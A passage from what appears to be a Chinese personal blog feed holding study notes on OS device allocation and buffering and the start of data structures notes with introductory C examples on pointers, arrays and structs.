title="5.6.1 设备分配管理中的数据结构"></a>5.6.1 设备分配管理中的数据结构</h3><img src="/posts/d04bd5bc/5.6.1.png" class="" title="设备分配管理中的数据结构"><img src="/posts/d04bd5bc/5.6.2.png" class="" title="设备分配管理中的数据结构"><img src="/posts/d04bd5bc/5.6.3.png" class="" title="设备分配管理中的数据结构"><img src="/posts/d04bd5bc/5.6.4.png" class="" title="设备分配管理中的数据结构"><img src="/posts/d04bd5bc/5.6.5.png" class="" title="设备分配管理中的数据结构"><h3 id="5-6-2-设备分配的步骤"><a href="#5-6-2-设备分配的步骤" class="headerlink" title="5.6.2 设备分配的步骤"></a>5.6.2 设备分配的步骤</h3><ol><li>根据进程请求的物理设备名找到SDT(注：物理设备名是进程请求分配设备时提供的参数)</li><li>根据SDT找到DCT，若设备忙碌则将进程PCB挂到设备等待队列中，不忙碌则将设备分配给进程</li><li>根据DCT找到COCT，若控制器忙碌则将进程PCB挂到控制器等待队列中，不忙碌则将控制器分配给进程</li><li>根据COCT找到CHCT，若通道忙碌则将进程PCB挂到通道等待队列中，不忙碌则将通道分配给进程</li></ol><p>注：只有设备、控制器、通道三者都分配成功时，这次设备分配才算成功，之后便可启动I/O设备进行数据传送。</p><p>缺点：</p><p>①用户编程时必须使用“物理设备名”，底层细节对用户不透明，不方便编程；</p><p>②若换了一个物理设备，则程序无法运行；</p><p>③若改进请求的物理设备正在忙碌，则即使系统中还有同类型的设备，进程也必须阻塞等待。</p><p>改进方法：建立逻辑设备名与物理设备名的映射机制，用户编程时只需提供逻辑设备名。</p><ol><li>根据进程请求的逻辑设备名找到SDT(注：用户编程时提供的逻辑设备名其实就是“设备类型”)</li><li>查找SDT，找到用户进程指定类型的、并且空闲的设备，将其分配给该进程。操作系统在逻辑设备表(LUT)中新增一个表项</li><li>根据DCT找到COCT，若控制器忙碌则将进程PCB挂到控制器等待队列中，不忙碌则将控制器分配给进程</li><li>根据COCT找到CHCT，若通道忙碌则将进程PCB挂到通道等待队列中，不忙碌则将通道分配给进程</li></ol><p>逻辑设备表(LUT)建立了逻辑设备名与物理设备名之间的映射关系。如果之后用户进程再次通过相同的逻辑设备名请求使用设备，则操作系统通过LUT表即可知道用户进程实际要使用的是那个物理设备了，并且也能知道该设备的驱动程序入口地址。</p><p>逻辑设备表的设置问题：</p><p>整个系统只有一张LUT：各用户所用的逻辑设备名不允许重复，适用于单用户操作系统。</p><p>每个用户一张LUT：不同用户的逻辑设备名可重复，适用于多用户操作系统。</p><h2 id="5-7-缓冲区管理"><a href="#5-7-缓冲区管理" class="headerlink" title="5.7 缓冲区管理"></a>5.7 缓冲区管理</h2><img src="/posts/d04bd5bc/5.7.1.png" class="" title="缓冲区管理"><img src="/posts/d04bd5bc/5.7.2.png" class="" title="缓冲区管理"><h3 id="5-7-1-单缓冲"><a href="#5-7-1-单缓冲" class="headerlink" title="5.7.1 单缓冲"></a>5.7.1 单缓冲</h3><img src="/posts/d04bd5bc/5.7.3.png" class="" title="单缓冲"><h3 id="5-7-2-双缓冲"><a href="#5-7-2-双缓冲" class="headerlink" title="5.7.2 双缓冲"></a>5.7.2 双缓冲</h3><img src="/posts/d04bd5bc/5.7.4.png" class="" title="双缓冲"><img src="/posts/d04bd5bc/5.7.5.png" class="" title="双缓冲"><p>结论：采用双缓冲策略，处理一个数据块的平均耗时为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="15.432ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6821.1 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="61" d="M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z" transform="translate(833,0)"></path><path data-c="78" d="M201 0Q189 3 102 3Q26 3 17 0H11V46H25Q48 47 67 52T96 61T121 78T139 96T160 122T180 150L226 210L168 288Q159 301 149 315T133 336T122 351T113 363T107 370T100 376T94 379T88 381T80 383Q74 383 44 385H16V431H23Q59 429 126 429Q219 429 229 431H237V385Q201 381 201 369Q201 367 211 353T239 315T268 274L272 270L297 304Q329 345 329 358Q329 364 327 369T322 376T317 380T310 384L307 385H302V431H309Q324 428 408 428Q487 428 493 431H499V385H492Q443 385 411 368Q394 360 377 341T312 257L296 236L358 151Q424 61 429 57T446 50Q464 46 499 46H516V0H510H502Q494 1 482 1T457 2T432 2T414 3Q403 3 377 3T327 1L304 0H295V46H298Q309 46 320 51T331 63Q331 65 291 120L250 175Q249 174 219 133T185 88Q181 83 181 74Q181 63 188 55T206 46Q208 46 208 23V0H201Z" transform="translate(1333,0)"></path></g><g data-mml-node="mo" transform="translate(1861,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2250,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mo" transform="translate(2954,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(3398.7,0)"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mo" transform="translate(4380.9,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(5381.1,0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mo" transform="translate(6432.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p><h3 id="5-7-3-单-双缓冲区的区别"><a href="#5-7-3-单-双缓冲区的区别" class="headerlink" title="5.7.3 单/双缓冲区的区别"></a>5.7.3 单/双缓冲区的区别</h3><img src="/posts/d04bd5bc/5.7.6.png" class="" title="单/双缓冲"><img src="/posts/d04bd5bc/5.7.7.png" class="" title="单/双缓冲"><h3 id="5-7-4-循环缓冲区"><a href="#5-7-4-循环缓冲区" class="headerlink" title="5.7.4 循环缓冲区"></a>5.7.4 循环缓冲区</h3><img src="/posts/d04bd5bc/5.7.8.png" class="" title="循环缓冲区"><h3 id="5-7-5-缓冲池"><a href="#5-7-5-缓冲池" class="headerlink" title="5.7.5 缓冲池"></a>5.7.5 缓冲池</h3><img src="/posts/d04bd5bc/5.7.9.png" class="" title="缓冲池">]]></content>
    
    
    <summary type="html">&lt;p&gt;这个笔记是基于 &lt;a href=&quot;https://www.bilibili.com/video/BV1YE411D7nH?p=1&quot;&gt;王道考研 操作系统&lt;/a&gt; 写的，我觉得前面会讲得有点枯燥，但后面结合图和例题讲算法时非常不错，可以一看。&lt;/p&gt;</summary>
    
    
    
    <category term="基础知识" scheme="http://example.com/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>数据结构</title>
    <link href="http://example.com/posts/79666db.html"/>
    <id>http://example.com/posts/79666db.html</id>
    <published>2022-04-11T13:12:08.297Z</published>
    <updated>2022-04-22T07:09:24.564Z</updated>
    
    <content type="html"><![CDATA[<p>呜呜呜笔试的痛，基础一定要打好啊！要不然就像我一样要把知识重新捡回来了。我大一学数据结构就是跟着郝斌老师学的，非常nice！<a href="https://www.bilibili.com/video/BV11s41167h6?p=1">【郝斌】数据结构入门</a></p><p>由于郝斌老师的视频不完整，所以我又找了 <a href="https://www.bilibili.com/video/BV1nJ411V7bd?p=63">数据结构与算法基础（青岛大学-王卓）</a> 补上缺的那部分的知识。</p><p>记笔记记到一半上来感慨一下，绝了姐妹们！温故而知新，我把之前学的知识串通起来了！</p><span id="more"></span><h1 id="1-预备知识"><a href="#1-预备知识" class="headerlink" title="1. 预备知识"></a>1. 预备知识</h1><p><strong>数据结构定义</strong>： 我们如何把现实中大量而复杂的问题以特定的数据类型和特定的存储结构保存到主存储器(内存)中，以及在此基础上为实现某个功能(比如查找、删除、排序)而执行的相应操作，这个相应的操作也就是算法。</p><p>数据结构 = 个体 + 个体的关系</p><p>算法 = 对存储数据的操作</p><p>程序 = 数据结构 + 算法</p><p><strong>衡量算法的标准</strong>：</p><ol><li>时间复杂度：程序要执行的次数，而非确定时间</li><li>空间复杂度：算法执行过程中所占用的最大内存</li><li>难易程度</li><li>健壮性</li></ol><h2 id="1-1-指针"><a href="#1-1-指针" class="headerlink" title="1.1 指针"></a>1.1 指针</h2><p>地址：内存单元的编号，范围从00000000 — FFFFFFFF（0~4G-1）。</p><p>指针：指针(*p)就是地址，地址就是指针。指针变量(p)是存放内存单元地址的变量。指针的本质是一个操作受限的非负整数。指针不等于指针变量。所有指针变量只占4个字节。</p><p>变量：给地址起了个别名。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> *p;<span class="comment">//p是个指针变量，int *表示p变量只能存储int类型变量的地址</span></span><br><span class="line">    <span class="type">int</span> j = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">char</span> ch = <span class="string">'A'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//j = *p;//*p是野指针，因为没有被初始化</span></span><br><span class="line">    <span class="comment">//p = &amp;ch;//数据类型不一致</span></span><br><span class="line">    p = &amp;j;</span><br><span class="line">    *p = j;<span class="comment">//等价于j = j;</span></span><br><span class="line">    i = *p;</span><br><span class="line">    <span class="type">int</span> *q = &amp;j;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"i = %d, j = %d, *p = %d, *q = %d\n"</span>, i, j, *p, *q);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">i = 10, j = 10, *p = 10, *q = 10</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/posts/79666db/1.1.jpg" class="" title="指针"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">{</span><br><span class="line">    i = <span class="number">100</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i = <span class="number">9</span>;</span><br><span class="line">    f(i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"i = %d\n"</span>, i);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">i = 9</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> *i)</span></span><br><span class="line">{</span><br><span class="line">    *i = <span class="number">100</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i = <span class="number">9</span>;</span><br><span class="line">    f(&amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"i = %d\n"</span>, i);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">i = 100</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/posts/79666db/1.1.2.jpg" class="" title="指针"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> **q)</span></span><br><span class="line">{</span><br><span class="line">    **q = <span class="number">100</span>;</span><br><span class="line">    *q = (<span class="type">int</span> *)<span class="number">0xFFFFFFFF</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i = <span class="number">9</span>;</span><br><span class="line">    <span class="type">int</span> *p = &amp;i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, p);<span class="comment">//p变量存的内容以地址的形式输出，也就是打印i的地址</span></span><br><span class="line">    <span class="comment">//printf("%p\n", &amp;p);//打印p变量的地址</span></span><br><span class="line">    f(&amp;p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"i = %d, p = %p\n"</span>, i, p);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">0101F86C</span></span><br><span class="line"><span class="comment">i = 100, p = FFFFFFFF</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/posts/79666db/1.1.3.jpg" class="" title="指针"><h2 id="1-2-数组"><a href="#1-2-数组" class="headerlink" title="1.2 数组"></a>1.2 数组</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>] = {<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>};<span class="comment">//a[i] == *(a+i) == *(i+a) == i[a]</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, a + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, a + <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *a + <span class="number">3</span>);<span class="comment">//*a+3 == a[0]+3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">0056FB1C</span></span><br><span class="line"><span class="comment">0056FB20</span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/posts/79666db/1.2.1.jpg" class="" title="数组"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Show_Array</span><span class="params">(<span class="type">int</span> *p, <span class="type">int</span> len)</span></span><br><span class="line">{</span><br><span class="line">    p[<span class="number">2</span>] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, p[i]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>] = {<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>};</span><br><span class="line">    Show_Array(a, <span class="number">5</span>);<span class="comment">//a等价于&amp;a[0],&amp;a[0]本身就是int *类型</span></span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">1 2 -1 4 5</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/posts/79666db/1.2.2.jpg" class="" title="数组"><h2 id="1-3-结构体"><a href="#1-3-结构体" class="headerlink" title="1.3 结构体"></a>1.3 结构体</h2><p>为什么会出现结构体：为了表示一些复杂的数据，而普通的基本类型变量无法满足要求。</p><p><strong>结构体定义</strong>：结构体是用户根据实际需要自己定义的复合数类型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> sid;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">st</span> =</span> {<span class="number">1000</span>, <span class="string">"zhangsan"</span>, <span class="number">20</span>};</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %s %d\n"</span>, st.sid, st.name, st.age);</span><br><span class="line">    st.sid = <span class="number">2000</span>;</span><br><span class="line">    <span class="comment">//st.name = "lisi";//name是个数组指针变量，左右数据类型不一致</span></span><br><span class="line">    <span class="built_in">strcpy</span>(st.name, <span class="string">"lisi"</span>);</span><br><span class="line">    st.age = <span class="number">21</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %s %d\n"</span>, st.sid, st.name, st.age);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">1000 zhangsan 20</span></span><br><span class="line"><span class="comment">2000 lisi 21</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> sid;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">st</span>;</span><span class="comment">//类似于int i;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> * <span class="title">pst</span>;</span><span class="comment">//类似于int *p;</span></span><br><span class="line">    pst = &amp;st;<span class="comment">//类似于p = &amp;i;</span></span><br><span class="line">    pst-&gt;sid = <span class="number">99</span>;<span class="comment">//类似于*p = 99;</span></span><br><span class="line">    <span class="comment">//pst-&gt;sid等价于(*pst).sid等价于st.sid</span></span><br><span class="line">    <span class="comment">//结构体指针变量后是"-&gt;"</span></span><br><span class="line">}    </span><br></pre></td></tr></table></figure><p>注意事项：结构体变量不能进行算术运算，但是可以相互赋值；普通结构体变量和结构体指针变量作为函数传参的问题，推荐使用传递结构体指针的方式，这样效率高、节约内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> sid;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="keyword">struct</span> Student * 